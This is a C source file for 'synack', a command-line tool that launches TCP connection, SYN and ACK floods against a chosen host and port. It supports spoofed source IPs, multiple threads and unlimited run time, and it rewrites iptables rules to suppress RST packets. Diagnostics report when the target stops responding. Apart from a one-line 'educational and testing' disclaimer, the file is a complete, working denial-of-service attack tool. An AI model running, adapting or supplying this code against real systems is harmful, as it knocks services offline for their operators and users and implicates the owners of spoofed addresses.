/* Created by edubart FOR EDUCATIONAL AND TESTING purposes only.
 * Project page https://github.com/edubart/synack
 */

#include "leef.h"

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>
#include <pthread.h>

#define CONN_FLOOD 1
#define SYN_FLOOD  2
#define ACK_FLOOD  3

int running = 1;
uint32_t interface_addr;
const char *interface = NULL;
uint32_t dest_addr;
uint16_t dest_port;
uint32_t sleep_interval = 10000;
uint16_t attack_uuid;
uint32_t attack_time = 0;
int num_threads = 1;
int attack_type = CONN_FLOOD;
int do_diagnostics = 1;

/* handle stop signals */
void signal_handler(int sig) {
    running = 0;
}

/* spoofing utilities */
uint32_t *spoof_addresses = NULL;
uint32_t spoof_addresses_size = 0;
uint32_t get_a_src_ip()
{
    if(spoof_addresses_size > 0) {
        int id;
        if(spoof_addresses_size > 1)
            id = leef_random_range(0, spoof_addresses_size-1);
        else
            id = 0;
        return spoof_addresses[id];
    }
    return interface_addr;
}

/* Connection flood */
uint8_t *send_data = NULL;
int send_data_size = 0;

void *conn_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint16_t src_port = leef_random_range(1025,65535);
    uint16_t id;
    uint32_t seq;

    while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
        if(++src_port <= 1024)
            src_port = 1025;
        id = leef_random_byte() << 8 | leef_random_byte();
        seq = attack_uuid << 16 | id;
        leef_send_tcp_syn(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

void *conn_flood_sniff_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, SNIFFING_AND_INJECTING))
        return NULL;
    leef_set_sniff_packet_size(&leef, 64);

    uint16_t src_port;
    uint16_t id;
    uint32_t seq;
    uint32_t ack_seq;
    uint32_t lastTicks;
    uint32_t ticksNow;
    int syn_sent = 0;
    int synack_received = 0;
    int rst_received = 0;
    int fin_received = 0;
    int alive_connections = 0;
    int new_connections = 0;
    struct leef_sniffed_packet packet;
    int conn_ports[65536];

    memset(conn_ports, 0, sizeof(conn_ports));

    lastTicks = leef_get_ticks();

    while(running) {
        ticksNow = leef_get_ticks();
        if(attack_time > 0 && ticksNow >= attack_time)
            break;

        /* outputs attack information */
        if(ticksNow - lastTicks >= 1000) {
            printf("SYN: %d/s, SYN+ACK: %d/s, RST: %d/s, FIN: %d/s, NEW CONNs: %d/sec, FAILED CONNs: %d/sec, ALIVE CONNs: %d\n",
                   syn_sent, synack_received, rst_received, fin_received, new_connections, syn_sent - new_connections, alive_connections);
            fflush(stdout);

            synack_received = 0;
            rst_received = 0;
            fin_received = 0;
            syn_sent = 0;
            new_connections = 0;
            lastTicks = ticksNow;
        }

        if(leef_sniff_next_packet(&leef, &packet)) {
            /* check if the packet is from the host */
            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port) {
                /* check if the packet was from this running attack instance */
                if(packet.in_ip.tcp->ack == 1 && attack_uuid != ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16))
                    continue;
                src_port = packet.in_ip.tcp->dest;
                /* SYN+ACK */
                if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
                id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
                seq = packet.in_ip.tcp->ack_seq;
                ack_seq = packet.in_ip.tcp->seq + 1;

                if(send_data_size) {
                    leef_send_raw_tcp(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq,
                        TCP_ACK | TCP_PUSH, 5840, 64, send_data_size, send_data);
                } else {
                    leef_send_tcp_ack(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq);
                }

                synack_received++;
                if(conn_ports[src_port] == 0) {
                    conn_ports[src_port] = 1;
                    alive_connections++;
                    new_connections++;
                }
                /* RST */
                } else if(packet.in_ip.tcp->rst == 1) {
                    static int warned = 0;
                    if(!warned && rst_received >= 0) {
                        printf("\nhost started rejecting connections\n");
                        fflush(stdout);
                        warned = 1;
                    }

                    rst_received++;

                    if(conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                /* FIN */
                } else if(packet.in_ip.tcp->fin == 1) {
                    static int warned = 0;
                    if(!warned && fin_received == 0) {
                        printf("\nhost started ending connections, guessed connection timeout: %d secs\n", leef_get_ticks() / 1000);
                        fflush(stdout);
                        warned = 1;
                    }

                    fin_received++;

                    if(conn_ports[src_port] == 1) {
                        alive_connections--;
                        conn_ports[src_port] = 0;
                    }
                }
            /* check if the packet is to the host */
            } else if(packet.ip->protocol == IPPROTO_TCP &&
                      packet.ip->saddr == interface_addr && packet.ip->daddr == dest_addr && packet.in_ip.tcp->dest == dest_port
                      && packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0) {
                if(attack_uuid != ((packet.in_ip.tcp->seq & 0xffff0000) >> 16))
                    continue;
                syn_sent++;
                if(conn_ports[packet.in_ip.tcp->source] == 1) {
                    conn_ports[packet.in_ip.tcp->source] = 0;
                    alive_connections--;
                }
            }
        }
    }
    printf("\n");

    leef_terminate(&leef);
    return NULL;
}

/* SYN flood */
void *syn_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint32_t src_ip;
    uint16_t src_port;
    uint16_t id;
    uint32_t seq;
    uint32_t lastTicks = leef_get_ticks();
    uint32_t ticksNow;
    int64_t lastTxPackets = leef_if_tx_packets(interface);
    int64_t txPackets;
    int64_t lastTxBytes = leef_if_tx_bytes(interface);
    int64_t txBytes;

    while(running) {
        ticksNow = leef_get_ticks();
        if(attack_time > 0 && ticksNow >= attack_time)
            break;
        if(!do_diagnostics) {
            if(ticksNow - lastTicks >= 1000) {
                txPackets = leef_if_tx_packets(interface);
                txBytes = leef_if_tx_bytes(interface);
                printf("%s TX: %d pkt/s, %.02f Mbps\n",
                    interface,
                    (int)(txPackets - lastTxPackets),
                    ((txBytes - lastTxBytes)*8)/1000000.0);
                fflush(stdout);
                lastTicks = ticksNow;
                lastTxPackets = txPackets;
                lastTxBytes = txBytes;
            }
        }

        src_ip = get_a_src_ip();
        src_port = leef_random_range(1025,65535);
        id = leef_random_u16();
        seq = attack_uuid << 16 | leef_random_u16();
        leef_send_tcp_syn(&leef, src_ip, dest_addr, src_port, dest_port, id, seq);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

/* ACK flood */
void *ack_flood_attack_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, INJECTING))
        return NULL;

    uint32_t src_ip;
    uint16_t src_port;
    uint16_t id;
    uint32_t seq;
    uint32_t ack;
    uint32_t lastTicks = leef_get_ticks();
    uint32_t ticksNow;
    int64_t lastTxPackets = leef_if_tx_packets(interface);
    int64_t txPackets;
    int64_t lastTxBytes = leef_if_tx_bytes(interface);
    int64_t txBytes;

    while(running) {
        ticksNow = leef_get_ticks();
        if(attack_time > 0 && ticksNow >= attack_time)
            break;
        if(!do_diagnostics) {
            if(ticksNow - lastTicks >= 1000) {
                txPackets = leef_if_tx_packets(interface);
                txBytes = leef_if_tx_bytes(interface);
                printf("%s TX: %d pkt/s, %.02f Mbps\n",
                    interface,
                    (int)(txPackets - lastTxPackets),
                    ((txBytes - lastTxBytes)*8)/1000000.0);
                fflush(stdout);
                lastTicks = ticksNow;
                lastTxPackets = txPackets;
                lastTxBytes = txBytes;
            }
        }
        src_ip = get_a_src_ip();
        src_port = leef_random_range(1025,65535);
        id = leef_random_u16();
        seq = attack_uuid << 16 | leef_random_u16();
        ack = leef_random_u32();
        leef_send_tcp_ack(&leef, src_ip, dest_addr, src_port, dest_port, id, seq, ack);
        if(sleep_interval)
            usleep(sleep_interval);
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

/* diagnostics attack rate and effectivness */
void *attack_diagnostic_thread(void *param)
{
    struct leef_handle leef;
    if(!leef_init(&leef, SNIFFING_AND_INJECTING))
        return NULL;
    leef_set_sniff_packet_size(&leef, 128);

    uint32_t lastTicks;
    int packets_sent = 0;
    struct leef_sniffed_packet packet;
    uint16_t src_port = leef_random_range(1025,65535);
    uint16_t id;
    uint32_t seq;
    uint32_t ping_ports[65536];
    uint32_t ticksNow;
    int no_pings = 0;
    memset(ping_ports, 0, sizeof(ping_ports));

    static struct timeval tv;
    gettimeofday(&tv, 0);
    uint32_t ping_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xffff;

    lastTicks = leef_get_ticks();

    while(running) {
        ticksNow = leef_get_ticks();
        if(attack_time > 0 && ticksNow >= attack_time)
            break;

        /* outputs attack information */
        if(ticksNow - lastTicks >= 1000) {
            switch(attack_type) {
                case SYN_FLOOD:
                    printf("SYN: ");
                    break;
                case ACK_FLOOD:
                    printf("ACK: ");
                    break;
            }
            printf("%d/s\n", packets_sent);
            fflush(stdout);

            packets_sent = 0;
            lastTicks = ticksNow;

            /* send a SYN ping */
            if(++src_port <= 1024)
                src_port = 1025;

            id = leef_random_u16();
            seq = ping_uuid << 16 | leef_random_u16();
            leef_send_tcp_syn(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq);
            ping_ports[src_port] = ticksNow;

            no_pings++;
            if(no_pings >= 6) {
                printf("no ping responses for at least %d secs, host down?\n", no_pings - 1);
            }
        }

        if(leef_sniff_next_packet(&leef, &packet)) {
            /* check if the packet is from the host */
            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port && ping_uuid == ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16)) {
                /* got a ping reply */
                if(ping_ports[packet.in_ip.tcp->dest] != 0) {
                    printf("ping response => flags=%s rrt=%d ms\n", leef_name_tcp_flags(&packet), (leef_get_ticks() - ping_ports[packet.in_ip.tcp->dest]));
                    ping_ports[packet.in_ip.tcp->dest] = 0;
                    no_pings = 0;
                }
            /* check if the packet is to the host */
            } else if(packet.ip->protocol == IPPROTO_TCP && packet.ip->daddr == dest_addr && packet.in_ip.tcp->dest == dest_port && attack_uuid == ((packet.in_ip.tcp->seq & 0xffff0000) >> 16)) {
                packets_sent++;
            }
        }
    }

    leef_terminate(&leef);
    running = 0;
    return NULL;
}

int main(int argc, char **argv)
{
    signal(SIGTERM, &signal_handler);
    signal(SIGINT, &signal_handler);

    if(argc < 4) {
        printf("Usage: %s <interface> <host> <port> [attack type] [options]\n", argv[0]);
        printf("Attack types:\n");
        printf("  -C                - Connection flood\n");
        printf("  -S                - SYN flood\n");
        printf("  -A                - ACK flood\n");
        printf("Options:\n");
        printf("  -m [threads]      - Number of attack threads\n");
        printf("  -t [attack time]  - Attack time in seconds\n");
        printf("  -s [ip]           - Custom spoofed ip (only for SYN or ACK flood)\n");
        printf("  -f [file]         - Read a list of ips from a file for spoofing (only for SYN or ACK flood)\n");
        printf("  -d [file]         - Send binary file as data (only for Connection flood)\n");
        printf("  -i [interval]     - Change sleep interval\n");
        printf("  -a [ip]           - Use a custom ip for interface (if you have multiples ips)\n");
        printf("  -n                - Don't do diagnostics, this can drasticaly improve output speed\n");
        printf("* send interval in microseconds\n");
        printf("* diagnostics is enabled on all attacks by default and will use interface ip address\n");
        printf("* default attack time: infinite\n");
        printf("* default threads: 1\n");
        printf("* default interval: 1000 usecs\n");
        printf("* default attack type: Connection flood\n");
        return 0;
    }

    /* generate attack uuid */
    static struct timeval tv;
    gettimeofday(&tv, 0);
    attack_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xffff;

    interface = argv[1];
    interface_addr = leef_if_ipv4(interface);
    dest_addr = leef_resolve_hostname(argv[2]);
    dest_port = atoi(argv[3]);

    int arg;
    const char *opt;
    for(arg=4;arg<argc;arg++) {
        opt = argv[arg];
        if(opt && opt[0] == '-' && strlen(opt) == 2) {
            switch(opt[1]) {
                case 'C':
                    attack_type = CONN_FLOOD;
                    break;
                case 'S':
                    attack_type = SYN_FLOOD;
                    break;
                case 'A':
                    attack_type = ACK_FLOOD;
                    break;
                case 'm':
                    num_threads = atoi(argv[++arg]);
                    if(num_threads <= 0) {
                        fprintf(stderr, "use at least 1 thread\n");
                        return -1;
                    }
                    break;
                case 's':
                    spoof_addresses_size = 1;
                    spoof_addresses = (uint32_t*)malloc(sizeof(uint32_t));
                    *spoof_addresses = leef_resolve_hostname(argv[++arg]);
                    break;
                case 'i':
                    sleep_interval = atoi(argv[++arg]);
                    break;
                case 'a':
                    interface_addr = leef_resolve_hostname(argv[++arg]);
                    break;
                case 'n':
                    do_diagnostics = 0;
                    break;
                case 'f': {
                    FILE *fp = fopen(argv[++arg], "r");
                    if(fp) {
                        char ip[32];
                        int ch;

                        printf("reading spoofed ip addresses...\n");
                        fflush(stdout);

                        spoof_addresses_size = 0;

                        fseek(fp, 0, SEEK_SET);
                        while((ch = fgetc(fp)) != EOF)
                            if(ch == '\n')
                                spoof_addresses_size++;

                        spoof_addresses = (uint32_t *)malloc(spoof_addresses_size * 4);

                        fseek(fp, 0, SEEK_SET);

                        ch = 0;
                        while(!feof(fp)) {
                            fgets(ip, 32, fp);
                            char *c;
                            while((c = strchr(ip, '\n')) || (c = strchr(ip, '\r')) || (c = strchr(ip, ' ')))
                                c[0] = 0;
                            uint32_t addr = leef_string_to_addr(ip);
                            if(addr != 0)
                                spoof_addresses[ch++] = addr;
                        }
                        fclose(fp);

                        spoof_addresses_size = ch;

                        printf("done, read %d ips\n", spoof_addresses_size);
                    } else {
                        fprintf(stderr, "failed opening spoof ips file!\n");
                        return -1;
                    }
                    break;
                }
                case 't':
                    attack_time = (uint32_t)(atoi(argv[++arg]))*1000;
                    break;
                case 'd': {
                    FILE *fp = fopen(argv[++arg], "rb");
                    if(fp) {
                        fseek(fp, 0, SEEK_END);
                        send_data_size = ftell(fp);
                        fseek(fp, 0, SEEK_SET);
                        send_data = (uint8_t *) malloc(send_data_size);
                        fread(send_data, send_data_size, 1, fp);
                        fclose(fp);
                    } else {
                        fprintf(stderr, "could not find data file %s\n", argv[arg]);
                        return -1;
                    }
                    break;
                }
                default:
                    printf("incorrect option %s\n", opt);
                    return -1;
            }
        } else {
            printf("incorrect option %s\n", opt);
            return -1;
        }
    }

    printf("target: %s:%d\n", leef_addr_to_string(dest_addr), dest_port);

    pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * num_threads);
    int i;

    system("iptables -F OUTPUT");
    system("iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP");

    leef_get_ticks();

    switch(attack_type) {
        case CONN_FLOOD:
            printf("stating attack type: Connection flood\n");
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, conn_flood_attack_thread, NULL);
            conn_flood_sniff_thread(NULL);
            break;
        case SYN_FLOOD:
            printf("stating attack type: SYN flood\n");
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, syn_flood_attack_thread, NULL);
            if(do_diagnostics)
                attack_diagnostic_thread(NULL);
            else {
                while(running && (attack_time <= 0 || leef_get_ticks() < attack_time))
                    usleep(1000000);
            }
            break;
        case ACK_FLOOD:
            printf("stating attack type: ACK flood\n");
            for(i=0; i < num_threads; ++i)
                pthread_create(&threads[i], NULL, ack_flood_attack_thread, NULL);
            if(do_diagnostics)
                attack_diagnostic_thread(NULL);
            else {
                while(running && (attack_time <= 0 || leef_get_ticks() < attack_time))
                    usleep(1000000);
            }
            break;
    }

    for(i=0;i<num_threads;++i)
        pthread_join(threads[i], NULL);

    if(spoof_addresses)
        free(spoof_addresses);

    return 0;
}

